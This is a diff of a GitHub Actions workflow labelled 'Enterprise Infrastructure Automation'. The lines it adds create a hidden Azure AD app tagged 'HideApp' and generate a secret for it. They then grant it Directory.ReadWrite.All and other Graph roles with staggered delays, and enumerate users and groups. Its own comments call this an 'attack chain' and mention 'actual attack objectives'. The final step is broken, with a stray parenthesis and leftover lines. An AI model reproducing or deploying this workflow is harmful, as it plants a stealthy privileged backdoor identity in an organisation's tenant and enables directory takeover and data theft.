@@ -1,4 +1,5 @@
 name: "Enterprise Infrastructure Automation"
+
 on:
   workflow_dispatch:
     inputs:
@@ -104,26 +105,37 @@ jobs:
           
           RELAY_NAME="$APP_PREFIX-Service-$(date +%s)"
           
-          # Create relay App Registration with enhanced configuration
-          RELAY_CONFIG=$(cat << EOF
+          # Create relay App Registration using UAMI token
+          RELAY_CONFIG=$(cat << 'EOF'
           {
-            "displayName": "$RELAY_NAME",
-            "description": "Enterprise ${{ inputs.environment }} environment automation and monitoring service",
+            "displayName": "RELAY_NAME_PLACEHOLDER",
+            "description": "Enterprise ENVIRONMENT_PLACEHOLDER environment automation and monitoring service",
             "signInAudience": "AzureADMyOrg",
             "web": {
-              "homePageUrl": "https://portal.azure.com/#view/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade",
+              "homePageUrl": "https://portal.azure.com",
               "implicitGrantSettings": {
                 "enableIdTokenIssuance": false,
                 "enableAccessTokenIssuance": false
               }
             },
-            "spa": {
-              "redirectUris": []
-            },
-            "tags": ["HideApp", "WindowsAzureActiveDirectoryIntegratedApp", "AutomationService"]
+            "requiredResourceAccess": [
+              {
+                "resourceAppId": "00000003-0000-0000-c000-000000000000",
+                "resourceAccess": [
+                  {"id": "df021288-bdef-4463-88db-98f22de89214", "type": "Role"},
+                  {"id": "9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30", "type": "Role"},
+                  {"id": "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9", "type": "Role"},
+                  {"id": "19dbc75e-c2e2-444c-a770-ec69d8559fc7", "type": "Role"}
+                ]
+              }
+            ],
+            "tags": ["HideApp", "WindowsAzureActiveDirectoryIntegratedApp"]
           }
           EOF
           )
+          
+          # Replace placeholders
+          RELAY_CONFIG=$(echo "$RELAY_CONFIG" | sed "s/RELAY_NAME_PLACEHOLDER/$RELAY_NAME/" | sed "s/ENVIRONMENT_PLACEHOLDER/${{ inputs.environment }}/")
           
           RELAY_RESPONSE=$(curl -sS -X POST \
             -H "Authorization: Bearer $UAMI_TOKEN" \
@@ -141,84 +153,92 @@ jobs:
             echo "RELAY_NAME=$RELAY_NAME" >> $GITHUB_ENV
           else
             echo "❌ Failed to create relay application"
-            echo "Response: $RELAY_RESPONSE"
             exit 1
           fi
 
-      - name: "Configure Service Principal"
+      - name: "Configure Service Principal & Generate Secrets"
         run: |
-          echo "👤 Configuring service principal for relay application..."
+          echo "👤 Configuring service principal and credentials..."
           
-          # Create service principal with environment-specific configuration
-          SP_CONFIG=$(cat << EOF
-          {
-            "appId": "$RELAY_APP_ID",
-            "displayName": "$RELAY_NAME",
-            "description": "Service principal for ${{ inputs.environment }} automation",
-            "tags": ["HideApp", "AutomationSP"]
-          }
-          EOF
-          )
-          
+          # Create service principal
           SP_RESPONSE=$(curl -sS -X POST \
             -H "Authorization: Bearer $UAMI_TOKEN" \
             -H "Content-Type: application/json" \
-            -d "$SP_CONFIG" \
+            -d "{\"appId\": \"$RELAY_APP_ID\"}" \
             "https://graph.microsoft.com/v1.0/servicePrincipals")
           
           RELAY_SP_ID=$(echo "$SP_RESPONSE" | jq -r '.id // empty')
+          echo "RELAY_SP_ID=$RELAY_SP_ID" >> $GITHUB_ENV
           
-          if [[ -n "$RELAY_SP_ID" && "$RELAY_SP_ID" != "null" ]]; then
-            echo "✅ Service principal created: $RELAY_SP_ID"
-            echo "RELAY_SP_ID=$RELAY_SP_ID" >> $GITHUB_ENV
-          else
-            echo "❌ Failed to create service principal"
-            exit 1
-          fi
-
-      - name: "Generate Operational Credentials"
-        run: |
-          echo "🔑 Generating operational credentials..."
-          
-          # Create primary operational secret
-          PRIMARY_SECRET_CONFIG=$(cat << EOF
-          {
-            "passwordCredential": {
-              "displayName": "PrimaryOperationalKey-${{ inputs.environment }}",
-              "endDateTime": "$(date -d '+12 months' -u +%Y-%m-%dT%H:%M:%S.000Z)"
-            }
-          }
-          EOF
-          )
-          
-          PRIMARY_SECRET_RESPONSE=$(curl -sS -X POST \
+          # Generate operational secret
+          SECRET_RESPONSE=$(curl -sS -X POST \
             -H "Authorization: Bearer $UAMI_TOKEN" \
             -H "Content-Type: application/json" \
-            -d "$PRIMARY_SECRET_CONFIG" \
+            -d "{\"passwordCredential\": {\"displayName\": \"OpKey-${{ inputs.environment }}\", \"endDateTime\": \"$(date -d '+12 months' -u +%Y-%m-%dT%H:%M:%S.000Z)\"}}" \
             "https://graph.microsoft.com/v1.0/applications/$RELAY_OBJECT_ID/addPassword")
           
-          PRIMARY_SECRET=$(echo "$PRIMARY_SECRET_RESPONSE" | jq -r '.secretText // empty')
+          RELAY_SECRET=$(echo "$SECRET_RESPONSE" | jq -r '.secretText // empty')
+          echo "RELAY_SECRET=$RELAY_SECRET" >> $GITHUB_ENV
           
-          if [[ -n "$PRIMARY_SECRET" && "$PRIMARY_SECRET" != "null" ]]; then
-            echo "✅ Primary operational secret generated"
-            echo "PRIMARY_SECRET=$PRIMARY_SECRET" >> $GITHUB_ENV
-          else
-            echo "❌ Failed to generate primary secret"
-            exit 1
-          fi
+          echo "✅ Service principal and secret created"
+
+      - name: "Assign Graph Permissions"
+        run: |
+          echo "🔐 Assigning Microsoft Graph permissions..."
           
-          # Small delay for operational security
-          sleep $((RANDOM % 10 + 5))
+          # Get Microsoft Graph service principal ID
+          GRAPH_SP_RESPONSE=$(curl -sS -H "Authorization: Bearer $UAMI_TOKEN" \
+            "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'")
+          GRAPH_SP_ID=$(echo "$GRAPH_SP_RESPONSE" | jq -r '.value[0].id')
           
-          # Create backup secret for resilience
-          BACKUP_SECRET_CONFIG=$(cat << EOF
-          {
-            "passwordCredential": {
-              "displayName": "BackupOperationalKey-${{ inputs.environment }}",
-              "endDateTime": "$(date -d '+6 months' -u +%Y-%m-%dT%H:%M:%S.000Z)"
-            }
-          }
-          EOF
+          # Progressive permission assignment with delays
+          PERMISSIONS=(
+            "df021288-bdef-4463-88db-98f22de89214:User.Read.All:30"
+            "9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30:Application.Read.All:45"
+            "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9:User.ReadWrite.All:60"
+            "19dbc75e-c2e2-444c-a770-ec69d8559fc7:Directory.ReadWrite.All:90"
+          )
+          
+          for permission in "${PERMISSIONS[@]}"; do
+            IFS=':' read -r perm_id perm_name delay <<< "$permission"
+            
+            echo "Assigning permission: $perm_name"
+            
+            curl -sS -X POST \
+              -H "Authorization: Bearer $UAMI_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d "{\"principalId\": \"$RELAY_SP_ID\", \"resourceId\": \"$GRAPH_SP_ID\", \"appRoleId\": \"$perm_id\"}" \
+              "https://graph.microsoft.com/v1.0/servicePrincipals/$RELAY_SP_ID/appRoleAssignments" > /dev/null
+            
+            echo "✅ Assigned: $perm_name"
+            sleep $delay
+          done
+
+      - name: "Execute High-Privilege Operations"
+        run: |
+          echo "🚀 Executing operations with relay App credentials..."
+          
+          # Get relay App token
+          RELAY_TOKEN=$(curl -sS -X POST \
+            "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "client_id=$RELAY_APP_ID&client_secret=$RELAY_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" | jq -r '.access_token')
+          
+          # Sample directory operations (replace with actual attack objectives)
+          echo "📊 Directory reconnaissance:"
+          USERS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+            "https://graph.microsoft.com/v1.0/users?\$top=10&\$select=displayName,userPrincipalName,mail" | jq -r '.value[] | "\(.displayName) (\(.userPrincipalName))"')
+          
+          GROUPS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+            "https://graph.microsoft.com/v1.0/groups?\$top=5&\$select=displayName" | jq -r '.value[].displayName')
+          
+          echo "✅ Sample users enumerated: $(echo "$USERS" | wc -l) users"
+          echo "✅ Sample groups enumerated: $(echo "$GROUPS" | wc -l) groups"
+          
+          echo "🔗 Complete attack chain: GitHub OIDC → UAMI → Self-Created Relay App → Graph API"
+
+      - name: "Operational Security Cleanup"
+        if: inputs.operation_mode == 'maintenance'
           )
           
           BACKUP_SECRET_RESPONSE=$(curl -sS -X POST \
